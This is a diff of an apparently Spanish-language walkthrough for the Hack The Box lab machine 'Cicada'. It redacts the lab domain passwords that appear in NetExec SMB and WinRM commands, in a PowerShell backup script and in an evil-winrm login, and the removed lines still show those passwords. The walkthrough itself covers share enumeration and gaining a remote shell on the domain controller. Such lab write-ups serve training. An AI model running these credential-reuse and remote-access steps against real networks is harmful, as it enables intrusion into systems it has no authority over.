@@ -204,9 +204,9 @@ Vemos la lista de usuarios, enumeramos la contraseña del usuario de dominio *Da
 
 Nos autenticamos con *David*, pero tampoco es administrador, pero si que tiene acceso al recurso "*DEV*":
 ```console
-> nxc smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares 
+> nxc smb 10.10.11.35 -u david.orelious -p '**********' --shares 
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3  
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:**********  
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares 
 SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark 
 SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------ 
@@ -231,7 +231,7 @@ $sourceDirectory = "C:\smb"
 $destinationDirectory = "D:\Backup" 
 
 $username = "emily.oscars" 
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force 
+$password = ConvertTo-SecureString "*************" -AsPlainText -Force 
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password) 
 $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss" 
 $backupFileName = "smb_backup_$dateStamp.zip" 
@@ -243,9 +243,9 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 Utilizamos las nuevas credenciales, vemos que tiene permisos para leer la carpeta *Admin* y de lectura y escritura en *C*, vamos mejorando!:
 ```console
-> nxc smb 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares 
+> nxc smb 10.10.11.35 -u emily.oscars -p '*************' --shares 
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt  
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:*************  
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares 
 SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark 
 SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------ 
@@ -260,13 +260,13 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ        
 
 *Emily* puede tener acceso por *winrm*, hacemos la prueba y vemos que si: 
 ```console
-> nxc winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
+> nxc winrm 10.10.11.35 -u emily.oscars -p '*************' 
 WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
-WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!) 
+WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:************* (Pwn3d!) 
 ```
 Nos conectamos con la herramienta **evil-winrm** y vemos nuestros permisos:
 ```console
-> evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
+> evil-winrm -i 10.10.11.35 -u emily.oscars -p '*************' 
 
 Evil-WinRM shell v3.5 
 
